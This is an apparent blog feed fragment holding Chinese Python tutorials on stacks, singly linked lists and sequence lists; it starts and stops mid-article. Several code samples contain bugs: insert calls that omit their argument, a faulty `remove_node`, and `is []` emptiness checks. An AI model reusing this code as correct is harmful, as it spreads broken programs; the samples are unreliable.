class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.stack.pop() # 弹出栈顶元素</span><br></pre></td></tr></table></figure><h2 id="3-4-获取栈顶元素"><a href="#3-4-获取栈顶元素" class="headerlink" title="3.4 获取栈顶元素"></a>3.4 获取栈顶元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 获取栈顶位置</span><br><span class="line">def getTop(self):</span><br><span class="line">    return self.top</span><br></pre></td></tr></table></figure><p>这里也可以直接使用列表，使用如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.stack[-1]</span><br></pre></td></tr></table></figure><h2 id="3-5-清空栈"><a href="#3-5-清空栈" class="headerlink" title="3.5 清空栈"></a>3.5 清空栈</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 清空栈</span><br><span class="line">def empty(self):</span><br><span class="line">    self.stack = []</span><br><span class="line">    self.top = -1</span><br></pre></td></tr></table></figure><h2 id="3-6-判断是否为空栈"><a href="#3-6-判断是否为空栈" class="headerlink" title="3.6 判断是否为空栈"></a>3.6 判断是否为空栈</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 判断是否为空栈</span><br><span class="line">def isEmpty(self):</span><br><span class="line">    if self.top == -1:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure><p>这里可以直接判断列表是否为空即可，使用如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return self.stack is []</span><br></pre></td></tr></table></figure><h2 id="3-7-判断是否为满栈"><a href="#3-7-判断是否为满栈" class="headerlink" title="3.7 判断是否为满栈"></a>3.7 判断是否为满栈</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 是否为满栈</span><br><span class="line">def isFull(self):</span><br><span class="line">    if self.top == self.size - 1:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br></pre></td></tr></table></figure><h2 id="3-8-完整代码"><a href="#3-8-完整代码" class="headerlink" title="3.8 完整代码"></a>3.8 完整代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/env python</span><br><span class="line"># encoding:utf-8</span><br><span class="line"></span><br><span class="line">class Stack:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.stack = []  # 栈列表</span><br><span class="line">        self.size = 20  # 栈大小</span><br><span class="line">        self.top = -1  # 栈顶位置</span><br><span class="line"></span><br><span class="line">    # 元素进栈</span><br><span class="line">    def push(self, element):</span><br><span class="line">        if self.isFull():  # 如果栈满，引发异常</span><br><span class="line">            raise StackException(&#x27;Stack is full&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            self.stack.append(element)</span><br><span class="line">            self.top += 1</span><br><span class="line"></span><br><span class="line">    # 元素出栈</span><br><span class="line">    def pop(self):</span><br><span class="line">        if self.isEmpty():  # 如果栈为空，则引发异常</span><br><span class="line">            raise StackException(&#x27;Stack is empty&#x27;)</span><br><span class="line">        else:</span><br><span class="line">            element = self.stack[-1]</span><br><span class="line">            self.top -= 1</span><br><span class="line">            del self.stack[-1]</span><br><span class="line">            return element</span><br><span class="line"></span><br><span class="line">    # 获取栈顶位置</span><br><span class="line">    def getTop(self):</span><br><span class="line">        return self.top</span><br><span class="line"></span><br><span class="line">    # 清空栈</span><br><span class="line">    def empty(self):</span><br><span class="line">        self.stack = []</span><br><span class="line">        self.top = -1</span><br><span class="line"></span><br><span class="line">    # 判断是否为空栈</span><br><span class="line">    def isEmpty(self):</span><br><span class="line">        if self.top == -1:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">    # 是否为满栈</span><br><span class="line">    def isFull(self):</span><br><span class="line">        if self.top == self.size - 1:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class StackException(Exception):  # 自定义异常类</span><br><span class="line">    def __init__(self, data):</span><br><span class="line">        self.data = data</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return self.data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">主函数</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    stack = Stack()  # 创建栈</span><br><span class="line">    for i in range(10):</span><br><span class="line">        stack.push(i)  # 元素进栈</span><br><span class="line">    print(&#x27;栈顶位置：&#x27;, stack.getTop())</span><br><span class="line">    while not stack.isEmpty():</span><br><span class="line">        print(stack.pop())  # 元素出栈</span><br><span class="line"></span><br><span class="line">    stack.empty()  # 清空栈</span><br><span class="line">    for i in range(21):</span><br><span class="line">        stack.push(i)  # 引发异常</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据结构 </tag>
            
            <tag> 栈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python数据结构(二)·单链表</title>
      <link href="/138.html"/>
      <url>/138.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>单链表是一种链式的数据结构，链表中的数据用结点表示，保持了数据之间的逻辑关系，但存储空间不一定是按照顺序存储。</p></blockquote><p>链表的基本元素有：</p><ul><li>节点：包括数据域和指针域，数据域存放数据，指针域存放指向下一个元素的指针</li><li>head：头结点</li><li>tail：尾结点</li><li>None：链表最后一个结点的指针域为None</li></ul><p>Python中没有显式的指针，但是有引用啊，<strong>所以我们可以通过定义节点类和引用来实现链表！</strong></p><p>链表分为单链表和单循环链表，双向链表和双向循环链表，本篇先讲一下单链表：</p><h2 id="2-1-定义节点类"><a href="#2-1-定义节点类" class="headerlink" title="2.1 定义节点类"></a>2.1 定义节点类</h2><p>节点类中包括节点数据和下一个节点地址，即引用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 节点类</span><br><span class="line">class Node(object):</span><br><span class="line"></span><br><span class="line">    # 单个节点 初始化 输入一个值data，将值变为一个节点</span><br><span class="line">    def __init__(self, data):</span><br><span class="line">        self.data = data</span><br><span class="line">        self.next = None</span><br><span class="line"></span><br><span class="line">    # 打印对象中具体的属性值</span><br><span class="line">    def __str__(self):</span><br><span class="line">        # 测试基本功能，输出data</span><br><span class="line">        return self.data</span><br><span class="line"># 输出data</span><br><span class="line">print(Node(&#x27;data&#x27;))</span><br></pre></td></tr></table></figure><p>这里的<code>__str__</code>可以不用写，这里是在进行测试，在后面的具体实现部分可以不用这个，str函数可以方便我们打印对象中具体的属性值，也是很nice了！具体使用如上</p><h2 id="2-2-获取链表的长度"><a href="#2-2-获取链表的长度" class="headerlink" title="2.2 获取链表的长度"></a>2.2 获取链表的长度</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 获取链表的长度</span><br><span class="line">def length(self):</span><br><span class="line">    cur = self.head</span><br><span class="line">    count = 0</span><br><span class="line">    while cur is not None:</span><br><span class="line">        count += 1</span><br><span class="line">        cur = cur.next</span><br><span class="line">    return count</span><br></pre></td></tr></table></figure><h2 id="2-3-头插元素"><a href="#2-3-头插元素" class="headerlink" title="2.3 头插元素"></a>2.3 头插元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 头部添加元素</span><br><span class="line">def add_fist(self, data):</span><br><span class="line">    node = Node(data)</span><br><span class="line">    node.next = self.head</span><br><span class="line">    self.head = node</span><br></pre></td></tr></table></figure><h2 id="2-4-尾插元素"><a href="#2-4-尾插元素" class="headerlink" title="2.4 尾插元素"></a>2.4 尾插元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 尾部添加元素</span><br><span class="line">def add_last(self, data):</span><br><span class="line">    node = Node(data)</span><br><span class="line">    # 如果链表为空，需要特殊处理</span><br><span class="line">    if self.is_empty():</span><br><span class="line">        self.head = node</span><br><span class="line">    else:</span><br><span class="line">        cur = self.head</span><br><span class="line">        while cur.next is not None:</span><br><span class="line">            cur = cur.next</span><br><span class="line">        # 退出循环的时候，curl指向尾结点</span><br><span class="line">        cur.next = node</span><br></pre></td></tr></table></figure><h2 id="2-5-指定位置插元素"><a href="#2-5-指定位置插元素" class="headerlink" title="2.5 指定位置插元素"></a>2.5 指定位置插元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 在指定位置添加元素</span><br><span class="line">def insert_node(self, index, data):</span><br><span class="line">    node = Node(data)</span><br><span class="line">    if index &lt; 0 or index &gt; self.length():</span><br><span class="line">        return False</span><br><span class="line">    elif index == 0:</span><br><span class="line">        self.add_fist()</span><br><span class="line">    elif index == self.length():</span><br><span class="line">        self.add_last()</span><br><span class="line">    else:</span><br><span class="line">        cur = self.head</span><br><span class="line">        count = 0</span><br><span class="line">        while count &lt; (index - 1):</span><br><span class="line">            count += 1</span><br><span class="line">            cur = cur.next</span><br><span class="line">        # 退出循环的时候，cur指向index的前一个位置</span><br><span class="line">        node.next = cur.next</span><br><span class="line">        cur.next = node</span><br></pre></td></tr></table></figure><h2 id="2-6-删除节点"><a href="#2-6-删除节点" class="headerlink" title="2.6 删除节点"></a>2.6 删除节点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 删除指定节点</span><br><span class="line">def remove_node(self, data):</span><br><span class="line">    cur = self.head  # 指针指向的结点</span><br><span class="line">    pre = None  # 指针指向结点的前一个</span><br><span class="line">    if self.head == data:</span><br><span class="line">        self.head.next = self.head</span><br><span class="line">    else:</span><br><span class="line">        while cur.data is not data:</span><br><span class="line">            # 不是要找的元素，移动游标</span><br><span class="line">            pre = cur</span><br><span class="line">            cur = cur.next</span><br><span class="line">        pre.next = cur.next</span><br></pre></td></tr></table></figure><h2 id="2-7-查找节点"><a href="#2-7-查找节点" class="headerlink" title="2.7 查找节点"></a>2.7 查找节点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 查找节点</span><br><span class="line">def search_node(self, data):</span><br><span class="line">    cur = self.head</span><br><span class="line">    while cur is not None:</span><br><span class="line">        if cur.data == data:</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            cur = cur.next</span><br><span class="line">    return False</span><br></pre></td></tr></table></figure><h2 id="2-8-打印链表"><a href="#2-8-打印链表" class="headerlink" title="2.8 打印链表"></a>2.8 打印链表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 遍历 打印链表</span><br><span class="line">def traverse_to_print_node(self):</span><br><span class="line">    # cur = self.head</span><br><span class="line">    # while cur is not None:</span><br><span class="line">    #     print(cur.data, end = &quot; &quot;)</span><br><span class="line">    #     cur = cur.next</span><br><span class="line">    print_list = []</span><br><span class="line">    cur = self.head</span><br><span class="line">    while cur is not None:</span><br><span class="line">        print_list.append(str(cur.data))</span><br><span class="line">        cur = cur.next</span><br><span class="line">    print(&#x27;-&gt;&#x27;.join(print_list))</span><br></pre></td></tr></table></figure><h2 id="2-9-测试代码"><a href="#2-9-测试代码" class="headerlink" title="2.9 测试代码"></a>2.9 测试代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 测试</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    list = SingleLinkedList()</span><br><span class="line">    list.add_fist(2)</span><br><span class="line">    list.add_fist(1)</span><br><span class="line">    list.add_last(4)</span><br><span class="line">    list.insert_node(2, 3)</span><br><span class="line">    list.traverse_to_print_node()</span><br><span class="line">    print(list.is_empty())</span><br><span class="line">    print(list.length())</span><br><span class="line">    list.remove_node(4)</span><br><span class="line">    print(list.search_node(3))</span><br><span class="line">    list.traverse_to_print_node()</span><br></pre></td></tr></table></figure><p>结果图：</p><p><img src="https://cos.gjcloak.xyz/02/image-20201215214543668.png" alt="结果图" title="结果图"></p><h2 id="2-10-完整代码"><a href="#2-10-完整代码" class="headerlink" title="2.10 完整代码"></a>2.10 完整代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/env python</span><br><span class="line"># encoding:utf-8</span><br><span class="line"></span><br><span class="line"># 节点类</span><br><span class="line">class Node(object):</span><br><span class="line"></span><br><span class="line">    # 单个节点 初始化 输入一个值data，将值变为一个节点</span><br><span class="line">    def __init__(self, data):</span><br><span class="line">        self.data = data</span><br><span class="line">        self.next = None</span><br><span class="line"></span><br><span class="line">    # 打印对象中具体的属性值</span><br><span class="line">    def __str__(self):</span><br><span class="line">        # 测试基本功能，输出data</span><br><span class="line">        return self.data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class SingleLinkedList(object):</span><br><span class="line"></span><br><span class="line">    # 创建一个单链表</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.head = None</span><br><span class="line"></span><br><span class="line">    # 判断链表是否为空</span><br><span class="line">    def is_empty(self):</span><br><span class="line">        return self.head is None</span><br><span class="line"></span><br><span class="line">    # 获取链表的长度</span><br><span class="line">    def length(self):</span><br><span class="line">        cur = self.head</span><br><span class="line">        count = 0</span><br><span class="line">        while cur is not None:</span><br><span class="line">            count += 1</span><br><span class="line">            cur = cur.next</span><br><span class="line">        return count</span><br><span class="line"></span><br><span class="line">    # 头部添加元素</span><br><span class="line">    def add_fist(self, data):</span><br><span class="line">        node = Node(data)</span><br><span class="line">        node.next = self.head</span><br><span class="line">        self.head = node</span><br><span class="line"></span><br><span class="line">    # 尾部添加元素</span><br><span class="line">    def add_last(self, data):</span><br><span class="line">        node = Node(data)</span><br><span class="line">        # 如果链表为空，需要特殊处理</span><br><span class="line">        if self.is_empty():</span><br><span class="line">            self.head = node</span><br><span class="line">        else:</span><br><span class="line">            cur = self.head</span><br><span class="line">            while cur.next is not None:</span><br><span class="line">                cur = cur.next</span><br><span class="line">            # 退出循环的时候，curl指向尾结点</span><br><span class="line">            cur.next = node</span><br><span class="line"></span><br><span class="line">    # 在指定位置添加元素</span><br><span class="line">    def insert_node(self, index, data):</span><br><span class="line">        node = Node(data)</span><br><span class="line">        if index &lt; 0 or index &gt; self.length():</span><br><span class="line">            return False</span><br><span class="line">        elif index == 0:</span><br><span class="line">            self.add_fist()</span><br><span class="line">        elif index == self.length():</span><br><span class="line">            self.add_last()</span><br><span class="line">        else:</span><br><span class="line">            cur = self.head</span><br><span class="line">            count = 0</span><br><span class="line">            while count &lt; (index - 1):</span><br><span class="line">                count += 1</span><br><span class="line">                cur = cur.next</span><br><span class="line">            # 退出循环的时候，cur指向index的前一个位置</span><br><span class="line">            node.next = cur.next</span><br><span class="line">            cur.next = node</span><br><span class="line"></span><br><span class="line">    # 删除指定节点</span><br><span class="line">    def remove_node(self, data):</span><br><span class="line">        cur = self.head  # 指针指向的结点</span><br><span class="line">        pre = None  # 指针指向结点的前一个</span><br><span class="line">        if self.head == data:</span><br><span class="line">            self.head.next = self.head</span><br><span class="line">        else:</span><br><span class="line">            while cur.data is not data:</span><br><span class="line">                # 不是要找的元素，移动游标</span><br><span class="line">                pre = cur</span><br><span class="line">                cur = cur.next</span><br><span class="line">            pre.next = cur.next</span><br><span class="line"></span><br><span class="line">    # 查找节点</span><br><span class="line">    def search_node(self, data):</span><br><span class="line">        cur = self.head</span><br><span class="line">        while cur is not None:</span><br><span class="line">            if cur.data == data:</span><br><span class="line">                return True</span><br><span class="line">            else:</span><br><span class="line">                cur = cur.next</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    # 遍历 打印链表</span><br><span class="line">    def traverse_to_print_node(self):</span><br><span class="line">        # cur = self.head</span><br><span class="line">        # while cur is not None:</span><br><span class="line">        #     print(cur.data, end = &quot; &quot;)</span><br><span class="line">        #     cur = cur.next</span><br><span class="line">        print_list = []</span><br><span class="line">        cur = self.head</span><br><span class="line">        while cur is not None:</span><br><span class="line">            print_list.append(str(cur.data))</span><br><span class="line">            cur = cur.next</span><br><span class="line">        print(&#x27;-&gt;&#x27;.join(print_list))</span><br><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    list = SingleLinkedList()</span><br><span class="line">    list.add_fist(2)</span><br><span class="line">    list.add_fist(1)</span><br><span class="line">    list.add_last(4)</span><br><span class="line">    list.insert_node(2, 3)</span><br><span class="line">    list.traverse_to_print_node()</span><br><span class="line">    print(list.is_empty())</span><br><span class="line">    print(list.length())</span><br><span class="line">    list.remove_node(4)</span><br><span class="line">    print(list.search_node(3))</span><br><span class="line">    list.traverse_to_print_node()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 单链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python数据结构(一)·顺序表</title>
      <link href="/140.html"/>
      <url>/140.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>list 是一种元素个数可变的线性表，采用了分离式技术实现的动态顺序表。可以加入和删除元素，并在各种操作中维持已有元素的顺序（即保序）。</p></blockquote><h2 id="1-1-创建顺序表"><a href="#1-1-创建顺序表" class="headerlink" title="1.1 创建顺序表"></a>1.1 创建顺序表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 创建顺序表</span><br><span class="line">def CreateSeqList(self):</span><br><span class="line">    element = input(&quot;please enter(input #:end):&quot;)</span><br><span class="line">    while element != &#x27;#&#x27;:</span><br><span class="line">        self.seqList.append(int(element))</span><br><span class="line">        element = input(&quot;please enter(input #:end):&quot;)</span><br></pre></td></tr></table></figure><h2 id="1-2-查找元素"><a href="#1-2-查找元素" class="headerlink" title="1.2 查找元素"></a>1.2 查找元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 查找顺序表中某一个元素</span><br><span class="line">def FindElement(self):</span><br><span class="line">    key = int(input(&quot;please enter what you want to find:&quot;))</span><br><span class="line">    if key in self.seqList:</span><br><span class="line">        keyPosition = self.seqList.index(key)</span><br><span class="line">        result = keyPosition</span><br><span class="line">    else:</span><br><span class="line">        result = &quot;none&quot;</span><br><span class="line">    return result</span><br></pre></td></tr></table></figure><h2 id="1-3-插入元素"><a href="#1-3-插入元素" class="headerlink" title="1.3 插入元素"></a>1.3 插入元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 在指定位置上插入元素</span><br><span class="line">def InsertElement(self):</span><br><span class="line">    postion = int(input(&quot;请输入要插入的位置：&quot;))</span><br><span class="line">    key = int(input(&quot;请输入要插入的值：&quot;))</span><br><span class="line">    print(&quot;插入前顺序：&quot;, self.seqList)</span><br><span class="line">    self.seqList.insert(postion, key)</span><br><span class="line">    print(&quot;插入后顺序：&quot;, self.seqList)</span><br></pre></td></tr></table></figure><h2 id="1-4-删除元素"><a href="#1-4-删除元素" class="headerlink" title="1.4 删除元素"></a>1.4 删除元素</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 在指定位置上删除元素</span><br><span class="line">def DeleteElement(self):</span><br><span class="line">    postion = int(input(&quot;请输入要删除元素的位置：&quot;))</span><br><span class="line">    print(&quot;删除前的顺序表：&quot;, self.seqList)</span><br><span class="line">    if postion &lt; len(self.seqList) and postion &gt;= 0:</span><br><span class="line">        del self.seqList[postion]</span><br><span class="line">        return self.seqList</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;不存在啊老铁，删除个毛线啊&quot;)</span><br></pre></td></tr></table></figure><h2 id="1-5-完整代码"><a href="#1-5-完整代码" class="headerlink" title="1.5 完整代码"></a>1.5 完整代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">class SequenceList:</span><br><span class="line"></span><br><span class="line">    # 初始化</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.seqList = [] # 初始化一个空表</span><br><span class="line"></span><br><span class="line">    # 